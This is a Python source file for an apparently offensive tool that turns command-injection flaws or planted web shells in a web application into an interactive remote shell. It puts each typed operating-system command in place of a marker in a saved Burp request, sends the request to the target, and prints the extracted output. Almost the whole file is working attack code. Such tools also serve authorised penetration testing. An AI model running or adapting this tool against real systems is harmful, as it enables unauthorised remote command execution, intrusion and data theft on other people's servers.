#!/usr/bin/python3
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.shortcuts import PromptSession, CompleteStyle, clear
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.application import Application
import sys
import socket
import ssl
import argparse
import re
import gzip
from lib import commands
from lib.parse import parseBurpRequest
from urllib import parse
from html.parser import HTMLParser
from bs4 import BeautifulSoup as bs

osCommands = None
customCommand = "<EZINJECT>"
VERBOSE = False

def ez_help():
    print("\nCommands:")
    print("  EzHelp              Display this menu")
    print("  clear                  Clear the screen")
    print("  cls                    Clear the screen")
    print("  exit                   Use exit command if you are in nested shell eg: if you called cmd within powershell")
    print("  quit                   Quits program")
    print("\nKey Combinations:")
    print("  Ctrl + c               Cancels command so that you can try again")
    print("  Ctrl + d               Quits program")
    print("\nFuture Commands To be Implemented:")
    print("  PowerDownload          Download remote file eg: PowerDownload <remote_dir> <local_dir>")
    print("  PowerUpload            Upload local file eg: PowerUpload <local_dir> <remote_dir>")
    print()

def prep_request(command, request):
    global customCommand
    encodedCommand = parse.quote(command)
    request = request.replace(customCommand, encodedCommand)
    request = request.replace("\n", "\r\n")
    # remove encoding headers
    request = re.sub(r"Accept-Encoding:.*\r\n", "", request)
    return request


def interactive_shell(reqFile, tls, os, help, definedCommand, pattern, firstOccurence):
    global osCommands
    global customCommand
    bindings = KeyBindings()

    # Operating system
    if args.os.lower() == 'windows':
        osCommands = WordCompleter(commands.commandsToComplete,
                                            ignore_case=True,
                                            sentence=True)
    elif args.os.lower() == 'linux':
        osCommands = WordCompleter(commands.commandsToCompleteBB,
                                            ignore_case=True,
                                            sentence=True)
    else:
        help()
        sys.exit(1)

    # customCommand
    if definedCommand != None:
        customCommand = definedCommand
    
    # if custom pattern
    if pattern != None:
        extractString = re.compile(pattern+'(.*?)'+pattern, re.DOTALL)

    # perform burp parsing
    request = parseBurpRequest(reqFile)

    prompt = "ez > "
    history = InMemoryHistory()
    session = PromptSession(completer=osCommands,
                            history=history,
                            auto_suggest=AutoSuggestFromHistory(),
                            mouse_support=True,
                            validate_while_typing=True,
                            complete_while_typing=True,
                            #complete_style=CompleteStyle.READLINE_LIKE,
                            search_ignore_case=True)
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if request["port"] != None:
            port = int(request["port"])
        elif tls:
            port = 443
        elif not tls:
            port = 80

        s.connect((request["host"], port))
        
        if tls:
            context = ssl.create_default_context()
            conn = context.wrap_socket(s, server_hostname=request["host"])
        else:
            conn = s

        try:
            command = session.prompt(message="%s " % prompt, key_bindings=bindings)
        except KeyboardInterrupt:
            continue  # Control-C, try again.
        except EOFError:
            if tls:
                conn.close()
            s.close()
            break  # Control-D, kill session.
        if len(command) <= 0:
            continue
        with conn:
            if (command == "EzHelp"):
                ez_help()
                continue
            elif (command == "clear") or (command == "cls"):
                clear()
                continue
            elif (command.lower() == "quit"):
                if tls:
                    conn.close()
                s.close()
                sys.exit()
            preparedCommand = str.encode(prep_request(command, request["requestDecoded"]))
            conn.send(preparedCommand)
            recv = conn.recv(4096)
            soup = bs(recv.decode(errors='ignore'), features="html.parser").text
            postHeader = soup.find("\n\n")+2
            if pattern != None:
                if not firstOccurence:
                    print(extractString.findall(soup)[-1])
                else:
                    print(extractString.findall(soup)[0])
            if VERBOSE:
                print(soup)
            else:
                # remove headers
                print(soup[postHeader:])
        if tls:
            conn.close()
        s.close()

if __name__ == '__main__':
    flags = argparse.ArgumentParser(description="Interact with web shells or command injection on web applications.")
    flags.add_argument('-v', '--verbose', dest='verbose', required=False, action='store_true', help="Display server reponse headers")
    flags.add_argument('-http', dest='tls', required=False, action='store_false', help="Force connecting over HTTPS")
    flags.add_argument('-r', '--request', dest='requestFile', required=True, help="Burp Request file")
    flags.add_argument('-os', '--operating-system', dest='os', required=True, help="Target operating system (Windows|Linux)")
    flags.add_argument('-c', '--command', dest='command', required=False, help="Command to replace in the burp file, ensure \
        this is unique in the request (defaults to <EZINJECT>)")
    flags.add_argument('-p', '--pattern', dest='pattern', required=False, help="Specify a pattern that is located either side of\
        command output to extract eg: --pattern ZZZ (this will filter ZZZ<command output>ZZZ)")
    flags.add_argument('-first', dest='firstOccurence', required=False, action='store_true', help="If command output is appended,\
        this will print the first occurence. (default: print the last occurence)")
    args = flags.parse_args()
    VERBOSE = args.verbose

    interactive_shell(args.requestFile, args.tls, args.os, flags.print_help, args.command, args.pattern, args.firstOccurence)
